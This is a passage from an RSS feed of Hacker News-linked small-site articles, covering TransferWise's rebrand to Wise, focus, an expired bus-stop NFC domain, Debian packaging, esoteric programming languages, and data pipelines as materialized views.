            <link>https://1b677b8f8bb20100.github.io/introduction/</link>
            <guid isPermaLink="false">hacker-news-small-sites-26218900</guid>
            <pubDate>Mon, 22 Feb 2021 00:28:01 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[TransferWise changes name to Wise]]>
            </title>
            <description>
<![CDATA[
Score 237 | Comments 225 (<a href="https://news.ycombinator.com/item?id=26218693">thread link</a>) | @watbe
<br/>
February 21, 2021 | https://wise.com/gb/blog/world-meet-wise | <a href="https://web.archive.org/web/*/https://wise.com/gb/blog/world-meet-wise">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
<div>
<div>
<p>Today, we’re changing our name from TransferWise to Wise.</p>
<p>Our customers now need us for more than money transfers. Sending, spending, and receiving money internationally is too expensive, slow, and inconvenient. We’re fixing that for people and businesses.</p>
<p>You can <a href="https://transferwise.com/gb/blog/world-meet-wise#transferwise-is-now-wise">skip ahead to see what changes for you</a> (spoiler: not much, right away), but first, let’s go back a bit.</p>
<h2><a href="#a-decade-into-our-mission" id="a-decade-into-our-mission"></a>A decade into our mission</h2>
<p>Ten years ago, Taavet and I set out to fix international money transfers for all of us who’d been overcharged and underserved by banks. We named our idea ‘TransferWise’ — because our early customers were ‘wise’ to know their banks were charging hidden fees in exchange rate markups.</p>
<p>We set ourselves a mission to make money work without borders — to make money move instantly, transparently, conveniently, and — eventually — for free.</p>
<p>Now, we’re a community of 10 million like-minded people and businesses managing money all over the world, saving billions and fighting as hard as ever against hidden fees.</p>
<p>Our multi-currency account and the clever debit card is replacing international banking for many of you. By building this infrastructure for you, we’ve created a platform that more than a dozen banks use today.</p>
<p>You’ve told us for years the problem is bigger than money transfers. Any time money moves into another currency, it’s still a maze of hidden exchange rate markups, high fees, delays, and small print.</p>
<h2><a href="#well-fix-international-banking-together" id="well-fix-international-banking-together"></a>We’ll fix international banking together</h2>
<p>Sending, spending, receiving, and holding money internationally doesn’t work like it should, because the international banking system was built for the past.</p>
<p>For generations, banks have been defined by borders. Traditional bank accounts trap our money in one country, making international lives more difficult and expensive than they need to be. We shouldn’t have to accept this status quo.</p>
<p>Today, we don’t. We’ll fix it with Wise — the world’s most international account. It makes your money borderless — with instant, super-cheap money transfers, a debit card to spend in any currency, account details to get paid in 30+ countries, balances to hold your money safely in 50+ different currencies, multi-currency direct debits, and other revolutionary features.</p>
<h2><a href="#transferwise-is-now-wise" id="transferwise-is-now-wise"></a>TransferWise is now Wise</h2>
<p>Today our name catches up with who we’re already building for — a community of people and businesses with multi-currency lives. Wise is for all of us who live, work, travel, or support family around the world. It’s for those of us who want to cut out the middlemen that hold us back from being truly borderless.</p>
<p>For customers, not too much will change right away. We become “Wise” or “Wise Business” — depending how you use us. You can access your exact same account via <a href="http://wise.com/">wise.com</a>, using your current email and password. You won't need a new account. In a few weeks we will start to redirect transferwise.com to wise.com.</p>
<p>Our logo has changed, and our apps will be renamed. But our icon — the fast flag — remains as a symbol for money without borders. Beyond that, you’ll notice some new colours, words, and designs.</p>
<p>The core experience of using Wise will remain faster, cheaper, and more convenient than anything else. Our mission remains the same. We’re still making — and always will be making — money work without borders.</p>
<p>We’re humbled that 10 million of you already rely on us to help you lead your international lives. We can’t wait to bring the next 100 million of you with us as we continue to build a new, fair, and transparent world of money.</p>
<p>Onwards.</p>
</div>
</div>
</div></div>]]>
            </description>
            <link>https://wise.com/gb/blog/world-meet-wise</link>
            <guid isPermaLink="false">hacker-news-small-sites-26218693</guid>
            <pubDate>Mon, 22 Feb 2021 00:02:25 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Loss of Focus]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 0 (<a href="https://news.ycombinator.com/item?id=26218656">thread link</a>) | @stanislavb
<br/>
February 21, 2021 | https://stanbright.com/loss-of-focus/ | <a href="https://web.archive.org/web/*/https://stanbright.com/loss-of-focus/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
    <div>
      <div>
        



<p><em>Loss of focus</em>, even for a moment, is always detrimental to what we are doing. That is quite obvious at pro-level sports disciplines - the moment you lose focus, your opponent takes advantage and scores.
In the end of the day, if you want to be a “pro” in any discipline, you need to learn how to sustain your focus for long periods of time.
Always being present and in the now. I came to this realisation while watching the Australian Open finals this year.
I guess that’s also amongst the reasons why the crowd could play a vital role in most games.
It could be both a distracting and a “get yourself together” force for players on the field.</p>

<p><strong>Unfortunately</strong>, that seems to be valid for everything we do in our lives and everything we work on.
Why “unfortunately”? Well, as it isn’t obvious.
We don’t always have that opponent waiting for our mistake to score. So we lose track.
And we lose focus very easily without any apparent repercussions.
Then, we still want to be pro and play the majors, and we wonder why that isn’t happening. It also happens that we blame external circumstances. At the same time,
the simple truth is that we just can’t sustain our focus at a pro-level.</p>

<p><strong>Fortunately</strong>, that is something that we have control over, and as long as we are willing to develop that skill - we can play the majors. In any discipline.</p>


<div>
  <p>
    Stan
  </p>
  <p>
    Feb 22, 2021<br>
    // Wisdom
  </p>
</div>




<hr>


      </div>
    </div>
  </div></div>]]>
            </description>
            <link>https://stanbright.com/loss-of-focus/</link>
            <guid isPermaLink="false">hacker-news-small-sites-26218656</guid>
            <pubDate>Sun, 21 Feb 2021 23:59:14 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Tap your phone at Gold Coast bus stops to access my website]]>
            </title>
            <description>
<![CDATA[
Score 92 | Comments 73 (<a href="https://news.ycombinator.com/item?id=26218432">thread link</a>) | @joshuawithers
<br/>
February 21, 2021 | https://joshwithers.blog/2021/02/22/tap-your-phone.html | <a href="https://web.archive.org/web/*/https://joshwithers.blog/2021/02/22/tap-your-phone.html">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><section>
      <p>My February 2021 Apple Fitness challenge is to walk 227km in the month. So I was out late last night closing in on the target when I stopped and looked at the bus timetable sign at a local bus stop.</p>

<p><img src="https://joshwithers.blog/uploads/2021/7f4522c3f4.jpg"></p>

<p>That NFC tag piqued my curiosity. I wondered if it worked on iPhone?</p>

<p>So I tapped my iPhone 12 Pro up against the NFC logo and a website hyperlink notification popped up like when you scan a QR code.</p>

<p><img src="https://joshwithers.blog/uploads/2021/0c4028d20c.jpg"></p>

<p>And TransLink, the local public transport provider, had neglected to renew the domain name used in the NFC tag.</p>

<p>I now own the <a href="http://transl.in/">transl.in</a> domain name and the people of the Gold Coast now have easy access to my website. 🤷‍♂️</p>

<p>As an example, a local bus stop links to <a href="http://transl.in/k_300428">http://transl.in/k_300428</a></p>

  </section></div>]]>
            </description>
            <link>https://joshwithers.blog/2021/02/22/tap-your-phone.html</link>
            <guid isPermaLink="false">hacker-news-small-sites-26218432</guid>
            <pubDate>Sun, 21 Feb 2021 23:29:19 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[What is Debian all about? Or: friction, packaging complex applications (2018)]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 1 (<a href="https://news.ycombinator.com/item?id=26218303">thread link</a>) | @mwcampbell
<br/>
February 21, 2021 | https://blog.liw.fi/posts/2018/02/17/what_is_debian_all_about_really_or_friction_packaging_complex_applications/ | <a href="https://web.archive.org/web/*/https://blog.liw.fi/posts/2018/02/17/what_is_debian_all_about_really_or_friction_packaging_complex_applications/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><article class="page">
    

    

    <div id="pagebody">
      <section>
	
<p>This weekend, those interested in Debian development have been having a <a href="https://lists.debian.org/debian-devel/2018/02/msg00295.html">discussion</a> on the debian-devel mailing list about “What can Debian do to provide complex applications to its users?”. I’m commenting on that in my blog rather than the mailing list, since this got a bit too long to be usefully done in an email.</p>
<p>directhex’s recent <a href="https://apebox.org/wordpress/linux/1229">blog post</a> “Packaging is hard. Packager-friendly is harder.” is also relevant.</p>

<p>To start with, I don’t think the email that started this discussion poses the right question. The problem not really about complex applications, we already have those in Debian. See, for example, LibreOffice. The discussion is really about how Debian should deal with the way some types of applications are developed upstream these days. They’re not all complex, and they’re not all big, but as usual, things only get interesting when <em>n</em> is big.</p>
<p>A particularly clear example is the whole nodejs ecosystem, but it’s not limited to that and it’s not limited to web applications. This is also not the first time this topic arises, but we’ve never come to any good conclusion.</p>
<p>My understanding of the problem is as follows:</p>
<blockquote>
<p>A current trend in software development is to use programming languages, often interpreted high level languages, combined with heavy use of third-party libraries, and a language-specific package manager for installing libraries for the developer to use, and sometimes also for the sysadmin installing the software for production to use. This bypasses the Linux distributions entirely. The benefit is that it has allowed ecosystems for specific programming languages where there is very little <em>friction</em> for using libraries written in that language to be used by developers, speeding up development cycles a lot.</p>
</blockquote>

<p>In comparison, in the old days, which for me means the 1990s, and before Debian took over my computing life, the cycle was something like this:</p>
<blockquote>
<p>I would be writing an application, and would need to use a library to make some part of my application easier to write. To use that library, I would download the source code archive of the latest release, and laboriously decipher and follow the build and installation instructions, fix any problems, rinse, repeat. After getting the library installed, I would get back to developing my application. Often the installation of the dependency would take hours, so not a thing to be undertaken lightly.</p>
</blockquote>

<p>With Debian, and apt, and having access to hundreds upon hundreds of libraries packaged for Debian, this become a much easier process. But only for the things packaged for Debian.</p>
<p>For those developing and publishing libraries, Debian didn’t make the process any easier. They would still have to publish a source code archive, but also hope that it would eventually be included in Debian. And updates to libraries in the Debian stable release would not get into the hands of users until the next Debian stable release. This is a lot of friction. For C libraries, that friction has traditionally been tolerable. The effort of making the library in the first place is considerable, so any friction added by Debian is small by comparison.</p>

<p>In the modern world, developing a new library is much easier, and so also the friction caused by Debian is much more of a hindrance. My understanding is that things now happen more like this:</p>
<blockquote>
<p>I’m developing an application. I realise I could use a library. I run the language-specific package manager (pip, cpan, gem, npm, cargo, etc), it downloads the library, installs it in my home directory or my application source tree, and in less than the time it takes to have sip of tea, I can get back to developing my application.</p>
</blockquote>
<p>This has a lot less friction than the Debian route. The attraction to application programmers is clear. For library authors, the process is also much streamlined. Writing a library, especially in a high-level language, is fairly easy, and publishing it for others to use is quick and simple. This can lead to a virtuous cycle where I write a useful little library, you use and tell me about a bug or a missing feature, I add it, publish the new version, you use it, and we’re both happy as can be. Where this might have taken weeks or months in the old days, it can now happen in minutes.</p>

<p>In this brave new world, <strong>why would anyone bother with Debian anymore?</strong> Or any traditional Linux distribution, since this isn’t particularly specific to Debian. (But I mention Debian specifically, since it’s what I now best.)</p>
<p>A number of things have been mentioned or alluded to in the <a href="https://lists.debian.org/debian-devel/2018/02/msg00295.html">discussion</a> mentioned above, but I think it’s good for the discussion to be explicit about them. As a computer user, software developer, system administrator, and software freedom <em>enthusiast</em>, I see the following reasons to continue to use Debian:</p>
<ul>
<li><p>The freeness of software included in Debian has been vetted. I have a <strong>strong guarantee</strong> that software included in Debian is free software. This goes beyond the licence of that particular piece of software, but includes practical considerations like the software can actually be built using free tooling, and that I have access to that tooling, because the tooling, too, is included in Debian.</p>
<ul>
<li><p>There was a time when Debian debated (with itself) whether it was OK to include a binary that needed to be built using a proprietary C compiler. We decided that it isn’t, or not in the main package archive.</p></li>
<li><p>These days we have the question of whether “minimised Javascript” is OK to be included in Debian, if it can’t be produced using tools packaged in Debian. My understanding is that we have already decided that it’s not, but the discussion continues. To me, this seems equivalent to the above case.</p></li>
</ul></li>
<li><p>I have a <strong>strong guarantee</strong> that software in a stable Debian release won’t change underneath me in incompatible ways, except in special circumstances. This means that if I’m writing my application and targeting Debian stable, the library API won’t change, at least not until the next Debian stable release. Likewise for every other bit of software I use. Having things to continue to work without having to worry is a good thing.</p>
<ul>
<li>Note that a side-effect of the low friction of library development current ecosystems sometimes results in the library API changing. This would mean my application would need to change to adapt to the API change. That’s friction for my work.</li>
</ul></li>
<li><p>I have a <strong>strong guarantee</strong> that a dependency won’t just disappear. Debian has a large mirror network of its package archive, and there are easy tools to run my own mirror, if I want to. While running my own mirror is possible for other package management systems, each one adds to the friction.</p>
<ul>
<li><p>The nodejs NPM ecosystem seems to be especially vulnerable to this. More than once packages have gone missing, resulting other projects, which depend on the missing packages, to start failing.</p></li>
<li><p>The way the Debian project is organised, it is almost impossible for this to happen in Debian. Not only are package removals carefully co-ordinated, packages that are depended on on by other packages aren’t removed.</p></li>
</ul></li>
<li><p>I have a <strong>strong guarantee</strong> that a Debian package I get from a Debian mirror is the official package from Debian: either the actual package uploaded by a Debian developer or a binary package built by a trusted Debian build server. This is because Debian uses cryptographic signatures of the package lists and I have a trust path to the Debian signing key.</p>
<ul>
<li><p>At least some of the language specific package managers fail to have such a trust path. This means that I have no guarantees that the library package I download today, was the same code uploaded by library author.</p></li>
<li><p>Note that https does not help here. It protects the transfer from the package manger’s web server to me, but makes absolutely no guarantees about the validity of the package. There’s been enough cases of the package repository having been attacked that this matters to me. Debian’s signatures protect against malicious changes on mirror hosts.</p></li>
</ul></li>
<li><p>I have a <strong>reasonably strong guarantee</strong> that any problem I find can be fixed, by me or someone else. This is not a strong guarantee, because Debian can’t do anything about insanely complicated code, for example, but at least I can rely on being able to rebuild the software. That’s a basic requirement for fixing a bug.</p></li>
<li><p>I have a <strong>reasonably strong guarantee</strong> that, after upgrading to the next Debian stable release, my stuff continues to work. Upgrades may always break, but at least Debian tests them and treats it as a bug if an upgrade doesn’t work, or loses user data.</p></li>
</ul>
<p>These are the reasons why I think Debian and the way it packages and distributes software is still important and relevant. (You may disagree. I’m OK with that.)</p>

<p>I don’t have much personal experience with non-Linux systems, so I’ve only talked about Linux here. I don’t think the BSD systems, for example, are actually all that different from Linux distributions. Feel free to substitute “free operating system” for “Linux” throughout.</p>

<p>The previous section is one level of abstraction too low. It’s important, but it’s beneficial take a further step back and consider what it is Debian actually tries to achieve. Why does Debian exist?</p>
<blockquote>
<p>The <strong>primary goal</strong> of Debian is to enable its users to use their computers using only free software. The freedom aspect is fundamentally important and a principle that Debian is not willing to compromise on.</p>
</blockquote>
<blockquote>
<p>The primary approach to achieve this goal is to produce a “distribution” of free software, to make installing a free software operating system and applications, and to maintain such a computer, a feasible thing for our users.</p>
</blockquote>
<p>This leads to secondary goals, such as:</p>
<ul>
<li><p>Making it easy to install Debian on a computer. (For values of easy that should be compared to toggling boot sector bytes manually.)</p>
<p>We’ve achieved this, though of course things can always be improved.</p></li>
<li><p>Making it easy to install applications on a computer with Debian. (Again, compared to the olden days, when that meant configuring and …</p></li></ul></section></div></article></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://blog.liw.fi/posts/2018/02/17/what_is_debian_all_about_really_or_friction_packaging_complex_applications/">https://blog.liw.fi/posts/2018/02/17/what_is_debian_all_about_really_or_friction_packaging_complex_applications/</a></em></p>]]>
            </description>
            <link>https://blog.liw.fi/posts/2018/02/17/what_is_debian_all_about_really_or_friction_packaging_complex_applications/</link>
            <guid isPermaLink="false">hacker-news-small-sites-26218303</guid>
            <pubDate>Sun, 21 Feb 2021 23:09:46 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Esoteric Programming Languages – The Obscure and Unconventional]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 1 (<a href="https://news.ycombinator.com/item?id=26218034">thread link</a>) | @karlzt
<br/>
February 21, 2021 | https://thecodebytes.com/esoteric-programming-languages/? | <a href="https://web.archive.org/web/*/https://thecodebytes.com/esoteric-programming-languages/?">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><article id="post-863"><header> <img width="1280" height="800" src="https://thecodebytes.com/wp-content/uploads/2020/11/computer-3163436_1280.png" alt="Esoteric Programming Languages" loading="lazy" srcset="https://thecodebytes.com/wp-content/uploads/2020/11/computer-3163436_1280.png 1280w, https://thecodebytes.com/wp-content/uploads/2020/11/computer-3163436_1280-300x188.png 300w, https://thecodebytes.com/wp-content/uploads/2020/11/computer-3163436_1280-1024x640.png 1024w, https://thecodebytes.com/wp-content/uploads/2020/11/computer-3163436_1280-768x480.png 768w" sizes="(max-width: 1280px) 100vw, 1280px"></header><section><h2>Introduction</h2> We all know that programming languages can be incredibly useful tools. However, what if there were languages that were not created to be used? Ones that test the boundaries of programming language design and cause even the most experienced programmers to bang their heads against the wall trying to build a simple program? Enter esoteric programming languages.<h2>What Are Esoteric Programming Languages?</h2> Most programming languages are designed for the purpose of widespread use and productivity. However, Esoteric programming languages (esolang) are a segment of programming languages that are not built for usability, but rather for entertainment, artistic intent, or to prove a concept. The word "esoteric" is <a href="https://www.etymonline.com/word/esoteric" target="_blank" rel="noopener noreferrer">derived from the Greek word "esoterikos"</a>, which means “belonging to an inner circle”. Esoteric languages are not intended to be widely understood.<h2>The Purpose of Esoteric Languages</h2> The first-ever esoteric programming language was <a href="http://catb.org/~esr/intercal/" target="_blank" rel="noopener noreferrer">INTERCAL</a>. A parody created by <a href="https://en.wikipedia.org/wiki/Don_Woods_(programmer)" target="_blank" rel="noopener noreferrer">Don Woods</a> and James M. Lyon in 1972 that mimicked popular languages at the time, such as <a href="https://stackoverflow.blog/2020/04/20/brush-up-your-cobol-why-is-a-60-year-old-language-suddenly-in-demand/">COBOL.</a> The idea was later revived in 1993 when Wouter van Oortmerssen designed <a href="http://strlen.com/false-language/" target="_blank" rel="noopener noreferrer">FALSE</a>. The concept was to build a powerful, tiny implementation (compiler executable of 1024 bytes) programming language with an obfuscated syntax that was disorienting to its users. From here, more recognizable names such as <a href="https://esolangs.org/wiki/Brainfuck" target="_blank" rel="noopener noreferrer">brainfuck</a> and <a href="https://esolangs.org/wiki/Befunge" target="_blank" rel="noopener noreferrer">Befunge</a> began to emerge and the concept of esoteric languages began to take shape as a concept.  As previously stated, esoteric languages have four main purposes. To act as a proof of concept, for competitive sport, display an artistic process and simply for entertainment. To better grasp these ideas, let's look into each of them with an example language.<h3>Proof of Concept (Brainfuck)</h3> The first purpose of esoteric languages we are going to look at is proof of concept. A language that was able to present a proof of concept to the computer science community was <a href="https://esolangs.org/wiki/Brainfuck" target="_blank" rel="noopener noreferrer">Brainfuck.</a> A minimalist programming language that contains an astonishing eight characters in total while still proving to be <a href="https://medium.com/@evinsellin/what-exactly-is-turing-completeness-a08cc36b26e2" target="_blank" rel="noopener noreferrer">Turing-complete</a>. The language should not be used for practical projects due to its complexity at scale (as the name suggests). However, it is interesting to see that a programming language can have its utilities with such a small amount of primitives. Here is an example of the language:  <h3>Competitive (Malbolge)</h3> Esoteric languages can also be viewed in a competitive context, such as Malbolge. Languages like Malbolge were created with the sole intent to be exceptionally incomprehensible and difficult to use. Achieved through self-modification, non-intuitive operators and encryption, Malbolge is one of the hardest programming languages to learn. It also very well could be the first of its kind for this purpose in mind. The competition revolving around Malbolge is contained within the premise of the language. That anyone able to make a useful program with Malbolge deserves bragging rights. Here's a sample of how difficult the language is to use.  <h3>Artistic (Shakespeare)</h3> The third purpose of esolang's are for artistic purposes. A popular example of this is the <a href="http://shakespearelang.com/" target="_blank" rel="noopener noreferrer">Shakespeare language</a>. A unique programming language that is meant to resemble the writing from Shakespearean plays. The language is unique, as it redefines the entire programming paradigm. Instead of focusing on producing an intended result, the goal is to make the code itself look more elegant. If only all our code looked as clean as this!  <h3>Entertainment (COW)</h3> Finally, some esoteric programming languages are simply meant to be entertaining.&nbsp; Such as the <a href="https://esolangs.org/wiki/COW" target="_blank" rel="noopener noreferrer">COW language by Sean Heber</a>. As a derivative of the Brainfuck language mentioned above, COW only has 12 primitive. All of which are different capitalizations of the word 'moo'. It's hard to imagine why someone would go through so much effort to create this language. In a way, this comical language really does grasp what programming is all about: incredibly frustrating, a little silly and most importantly, fun.  <h2>The Interesting Thing About Esoteric Languages</h2> So that's pretty much all you need to know about esoteric programming languages. In a strange way, they are like the 'conceptual art' of the programming world. Unconventional and weird, but often thought-provoking and fascinating. Esoteric languages break the recycled formula that most conventional languages follow. Making me believe that these languages could one day be the key to new applications of programming.  Although, if nothing else, they are fascinating designs to look at. Which remain untouched over years, without the over looming necessity to stay 'current' like the majority of popular languages today. Allowing them to only become more interesting with age.  You can check out a full list of esoteric programming languages, <a href="https://esolangs.org/wiki/Language_list" target="_blank" rel="noopener noreferrer">here.</a> If you have anything to add, I would love to hear it in the comment section below!  If you are a programmer that is interested in making passive income, <a href="https://thecodebytes.com/make-passive-income-programming-5-incomes-for-software-developers/">check out this</a>.  Most of the insights I gathered from this post were from <a href="https://esolangs.org/wiki/Main_Page" target="_blank" rel="noopener noreferrer">esolangs.org</a> and <a href="https://morr.cc/esolangs/esolangs.pdf" target="_blank" rel="noopener noreferrer">Esoteric Programming Languages by Sebastian Morr</a>.  Happy coding everyone!  &nbsp;</section></article></div></div>]]>
            </description>
            <link>https://thecodebytes.com/esoteric-programming-languages/?</link>
            <guid isPermaLink="false">hacker-news-small-sites-26218034</guid>
            <pubDate>Sun, 21 Feb 2021 22:38:24 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[A Data Pipeline Is a Materialized View]]>
            </title>
            <description>
<![CDATA[
Score 138 | Comments 47 (<a href="https://news.ycombinator.com/item?id=26217911">thread link</a>) | @nchammas
<br/>
February 21, 2021 | https://nchammas.com/writing/data-pipeline-materialized-view | <a href="https://web.archive.org/web/*/https://nchammas.com/writing/data-pipeline-materialized-view">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div aria-label="Content">
      <div>
        <article itemscope="" itemtype="http://schema.org/BlogPosting">

  

  <div itemprop="articleBody">
    <p>Say you run an online book store and want to build a data pipeline that figures out who the top-selling authors are. Logically, the input to the pipeline is a log of every individual book purchase on the store for all time, along with details about each book like who authored it. And the output is a list of the top-selling authors per month.</p>

<!-- [image: book purchases + authorship info -> top-selling authors of the month] -->

<div>
<figure>
    <span>
        <img src="https://nchammas.com/assets/images/data-pipeline-materialized-view/top-selling-authors.png" width="1000">
    </span>
    <figcaption>
    </figcaption>
</figure>
</div>

<p>The output of this data pipeline is a function of the input. In other words, the output is derived from the input by running the input through the pipeline.</p>

<!-- [image: f(input) -> output] -->

<div>
<figure>
    <span>
        <img src="https://nchammas.com/assets/images/data-pipeline-materialized-view/f-input-output.png" width="400">
    </span>
    <figcaption>
    </figcaption>
</figure>
</div>

<p>This is an important characteristic of the output. As long as the input data and pipeline transformations (i.e. the pipeline code) are preserved, the output can always be recreated. The input data is <em>primary</em>; if lost, it cannot be replaced. The output data, along with any intermediate stages in the pipeline, are <em>derivative</em>; they can always be recreated from the primary data using the pipeline.</p>

<h2 id="the-logical-view">The Logical View</h2>

<p>Let’s represent our hypothetical “Top-Selling Authors” pipeline as a directed graph, where the nodes represent datasets and the edges represent transformations of those datasets. Furthermore, let’s color each dataset in the graph based on whether it’s primary or derivative.</p>

<!-- [image: colored graph of transformations] -->

<div>
<figure>
    <span>
        <img src="https://nchammas.com/assets/images/data-pipeline-materialized-view/pipeline-graph.png" width="500">
    </span>
    <figcaption>
    </figcaption>
</figure>
</div>

<p>Most data pipelines, if you zoom out far enough, look something like this. You have some source data; it gets sliced, diced, and combined in various ways to produce some outputs. If someone were to wipe out all the derived data in this pipeline, you’d be able to regenerate it without any data loss. The pipeline could include any number of arbitrary steps, like copying files from an FTP share, or scraping data from a web page. It doesn’t matter as long as the pipeline produces the same output when given the same input.</p>

<p>Any time someone queries the output of the pipeline, it’s logically equivalent to them running the entire pipeline on the source data to get the output they’re looking for. In this way, a pipeline is a <a href="https://docs.microsoft.com/en-us/sql/relational-databases/views/views?view=sql-server-ver15">view</a> into the source data.</p>

<h2 id="materializing-the-view">Materializing the View</h2>

<p>Of course, data pipelines don’t work this way in practice. It would be a waste of resources and a long wait for users if every query triggered a series of computations stretching all the way back to the primary data. When you ask for this month’s top-selling authors, you expect a quick response.</p>

<p>Hence, the typical real-world pipeline <em>materializes</em> its output, and often also several of the intermediate datasets required to produce that final output. Materializing a dataset simply means saving it to persistent storage, as opposed to repeatedly computing it on the fly. So when you ask for that list of authors, whatever system answering your query can start from the closest materialized dataset, as opposed to starting at the source or primary data.</p>

<!-- [image: cached nodes in graph colored; key explaining colors; caption] -->

<div>
<figure>
    <span>
        <img src="https://nchammas.com/assets/images/data-pipeline-materialized-view/pipeline-with-cached-nodes.png" width="500">
    </span>
    <figcaption>
    A query against dataset B only needs to recompute the pipeline starting from A, since A is materialized.
    All derivative datasets, whether materialized or not, can be thrown away and recreated from the primary data.
    </figcaption>
</figure>
</div>

<p>So we’ve turned our view into a <em>materialized view</em>. “View” represents the logical transformations expressed in the pipeline. “Materialized” represents the fact that we cache the output of the pipeline, and perhaps also some of the intermediate steps. A complex set of interdependent data pipelines can be conceptualized in this way, as a graph of materialized views.</p>

<p>Note that this concept can be applied very broadly, and not just to what we think of as “normal” data pipelines:</p>
<ul>
  <li>A traditional web cache alleviates read traffic from the primary database, which is the source of truth. The cache is derivative and can be regenerated from the database at any time. The data in the cache is materialized so that incoming queries do not need to go all the way back to the database to get an answer.</li>
  <li>A build system compiles or assembles source code into artifacts like executables or test reports. The artifacts are derivative, whereas the source code is primary. When you run a program over and over, you reuse the artifacts output by your build system, as opposed to recompiling them from source every time.</li>
</ul>

<h2 id="updating-a-materialized-view">Updating a Materialized View</h2>

<p>Materializing the output, though a practical necessity for most pipelines, adds an administrative cost. When the source data changes, the materialized views need to be updated. Otherwise, the data you get from the view will be <em>stale</em>.</p>

<!-- [image: highlighted new source row; out-of-date output aggregation] -->

<div>
<figure>
    <span>
        <img src="https://nchammas.com/assets/images/data-pipeline-materialized-view/update-materialized-view.png" width="600">
    </span>
    <figcaption>
    The sales total of 101 for Eric Carle is stale. The correct value is now 103.
    </figcaption>
</figure>
</div>

<p>To update a materialized view, there are two high-level properties you typically care about: the update <em>trigger</em>, and the update <em>granularity</em>. The former affects the freshness of your output, which impacts end-users of the data, and the latter affects the performance of your update process, which impacts the engineers or operators responsible for that process.</p>

<h3 id="update-trigger">Update Trigger</h3>

<p>The update trigger is the event that prompts a refresh of the materialized view—e.g. by running your pipeline against the latest source data.</p>

<p>That event may be a file landing in a shared drive, or some data arriving on an event stream, or another pipeline completing. For some pipelines, the update trigger may just be a certain time of day, in which case it might be more useful to talk about the update <em>frequency</em> rather than trigger.</p>

<p>A typical batch pipeline, for example, might run on a daily or hourly cadence, whereas a streaming pipeline may run every few seconds or minutes, or whenever a new event is delivered via some sort of event stream. Whenever the pipeline runs, it updates its output, and the whole process can be viewed as a <em>refresh</em> of the materialized view.</p>

<h3 id="update-granularity">Update Granularity</h3>

<p>The update granularity refers to how much of the materialized view needs to be modified to account for the latest changes to the source data.</p>

<p>A common update granularity is the full refresh. No matter how small or large the change to the source data, when the pipeline runs it throws away the entire output table and rebuilds it from scratch.</p>

<p>A more sophisticated pipeline might rebuild only a subset of the table, like a date partition. And an extremely precise pipeline may know how to update exactly the output rows that are impacted by the latest changes to the source data.</p>

<p>The update trigger and granularity are independent. You can have a pipeline that runs every second and does a full refresh of its output, and you can have a pipeline that runs once a day but carefully updates only the rows that it needs to.</p>

<h3 id="typical-examples">Typical Examples</h3>

<p>Let’s explore these two properties a bit using our example pipeline that computes the top-selling authors of the month.</p>

<h4 id="the-daily-batch-update">The Daily Batch Update</h4>

<p>Every night at 1 a.m., an automated process looks for a dump of the latest purchases from the previous day. The dump is a compressed CSV file.</p>

<p>The update process uses this dump to recompute the month’s sales numbers for all authors. It replaces the entire output table with all-new calculations for all authors. Many of the authors’ numbers may not have changed since the last update (because they had no new sales in that time period), but they all get recomputed nonetheless.</p>

<p>This is a very typical example of a batch pipeline. It has a scheduled update trigger at 1 a.m. every night, and an update granularity of the entire output.</p>

<h4 id="the-live-updating-table">The Live-Updating Table</h4>

<p>In this version of our top-selling authors pipeline, individual purchases are streamed in as they happen, via a stream processor like Apache Kafka. Every purchase on this stream triggers an update to the calculation of top-selling authors.</p>

<p>The update process uses each individual purchase to incrementally recompute the sales total for the relevant author. If an author has no new sales over a given span of updates, their sales total is not recomputed (though their rank in the top-selling authors may need to be updated).</p>

<p>This is an example of a precise streaming pipeline. The update trigger is the purchase event that is streamed in, and the update granularity is the sales total for a single author.</p>

<h2 id="the-declarative-data-lake">The Declarative Data Lake</h2>

<p>We previously discussed the idea of conceptualizing your <a href="https://nchammas.com/writing/modern-data-lake-database">data lake as a database</a>. And here we’ve shown how you can conceptualize your data pipelines as materialized views.</p>

<p>But what if we could take this idea further than just as a conceptual tool? What if you could actually implement your data pipelines as a graph of materialized views?</p>

<p>Taken far enough, the promise of such an idea would be to build a <em>declarative data lake</em>, where the code that manages the lake focuses more on defining <em>what</em> the datasets are and less on <em>how</em> to mechanically build or update them.</p>

<p>Two relatively new projects express aspects of this vision in clear but different ways, and they merit some discussion here: <a href="https://www.getdbt.com/">dbt</a> and <a href="https://materialize.com/">Materialize</a>.</p>

<h3 id="dbt-pipelines-as-batch-updated-sql-queries">dbt: Pipelines as Batch-Updated SQL Queries</h3>

<p>The core of <a href="https://www.getdbt.com/">dbt</a> is an engine for building <a href="https://docs.getdbt.com/docs/introduction#what-makes-dbt-so-powerful">a graph of SQL queries</a>. Parts of any given query can be generated dynamically using a templating language (<a href="https://docs.getdbt.com/tutorial/using-jinja/">Jinja</a>), and queries can reference other queries.</p>

<p>Every query has a configured materialization strategy, which defines whether the results of the query are generated ahead of time, and if so, how they are stored and updated.</p>

<p>If the results are materialized, they can be updated with a full refresh or <a href="https://docs.getdbt.com/docs/building-a-dbt-project/building-models/configuring-incremental-models/#understanding-incremental-models">incrementally</a>, though there are some restrictions on what kinds of updates can be done incrementally. Updates are typically triggered on a schedule.</p>

<h3 id="materialize-pipelines-as-live-updated-materialized-views">Materialize: Pipelines as Live-Updated Materialized Views</h3>

<p><a href="https://materialize.com/">Materialize</a> is an engine for building live, incrementally updated materialized views from streaming sources like Apache Kafka. A view can reference other live-updated views, as well as fixed tables.</p>

